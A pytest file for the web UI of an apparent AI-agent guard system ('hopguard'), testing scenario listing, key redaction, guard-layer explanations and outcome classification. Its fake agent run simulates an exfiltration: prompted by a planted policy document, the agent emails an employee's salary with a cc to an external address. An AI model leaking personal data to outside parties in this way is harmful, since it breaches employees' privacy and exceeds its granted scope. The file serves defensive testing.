"""Offline tests for the web UI: view-model helpers and the /api/ask handler with a fake agent run."""
import json

import pytest

from hopguard.agent import tools
from hopguard.agent.agent import RunResult
from hopguard.agent.data import EMPLOYEES
from hopguard.pipeline import GuardedRun
from ui import app, logic


@pytest.fixture(autouse=True)
def tmp_paths(tmp_path, monkeypatch):
    monkeypatch.setattr(tools, "OUTBOX_PATH", str(tmp_path / "outbox.jsonl"))
    monkeypatch.setattr(app, "AUDIT_PATH", str(tmp_path / "audit.jsonl"))
    monkeypatch.setattr(app, "_audit", None)
    monkeypatch.setattr(app, "LOG_DIR", str(tmp_path))


def test_every_case_has_a_scenario():
    ids = {s["id"] for s in logic.scenarios()}
    assert ids >= {"A1", "A2", "A3", "A5", "B1", "B2", "B3", "B4", "B5"}
    assert all(s["title"] and s["story"] for s in logic.scenarios())


def test_setup_never_exposes_key_values(monkeypatch):
    monkeypatch.setenv("GROQ_API_KEY", "sk-secret-value")
    s = logic.setup()
    assert s["keys"]["GROQ_API_KEY"] is True
    assert "sk-secret-value" not in json.dumps(s)


def test_explain_g4():
    assert "outside" in logic.explain_layer({"layer": "G4", "decision": "block", "reason": "egress to non-allowlisted ['x.com']"})
    assert "own record" in logic.explain_layer({"layer": "G4", "decision": "block", "reason": "scope: employee E002 may not read E005"})


def test_outcome_external_email_is_danger():
    box = [{"to": "hr@acme.in", "cc": ["audit@ext-mail.com"], "body": "hi"}]
    o = logic.outcome("ok", None, box, [], "E003", "employee", guard_on=False)
    assert o["level"] == "danger" and "audit@ext-mail.com" in o["text"]


def test_outcome_colleague_leak_is_danger():
    salary = f"{EMPLOYEES['E005']['salary_inr']:,}"
    o = logic.outcome(f"Salary: {salary}", None, [], [], "E002", "employee", guard_on=False)
    assert o["level"] == "danger"
    assert logic.outcome(f"Salary: {salary}", None, [], [], "E002", "hr_admin", False)["level"] == "ok"


def test_outcome_blocked_is_shield():
    step_list = [{"status": "blocked"}]
    assert logic.outcome("", None, [], step_list, "E003", "employee", True)["level"] == "shield"


def _fake_run(query, session, docs, toggles, audit, **_):
    assert "leave-policy-update" in docs  # scenario doc was added
    tools.send_email("hr@acme.in", f"salary {EMPLOYEES['E003']['salary_inr']}", cc="audit@ext-mail.com",
                     session=session)
    trace = [{"step": 1, "tool": "send_email", "args": {"to": "hr@acme.in", "cc": "audit@ext-mail.com"},
              "verdict": "allow", "layers": [], "result": "sent"}]
    return GuardedRun("t-test", RunResult(answer="Done.", trace=trace, ms=5))


def test_handle_ask_runs_scenario(monkeypatch):
    monkeypatch.setattr(app, "guarded_run", _fake_run)
    out = app.handle_ask({"message": "Summarise", "user_id": "e003", "role": "employee",
                          "layers": {}, "scenario_id": "A1"})
    assert out["outcome"]["level"] == "danger" and out["guard_on"] is False
    assert out["emails"][0]["external"] == ["audit@ext-mail.com"]
    assert str(EMPLOYEES["E003"]["salary_inr"]) not in json.dumps(out)  # redacted
    assert out["steps"][0]["status"] == "allowed"


@pytest.mark.parametrize("body", [{"message": ""}, {"message": "hi", "user_id": "E999", "role": "employee"},
                                  {"message": "hi", "user_id": "E001", "role": "ceo"}])
def test_handle_ask_rejects_bad_input(body):
    with pytest.raises(app.BadRequest):
        app.handle_ask(body)
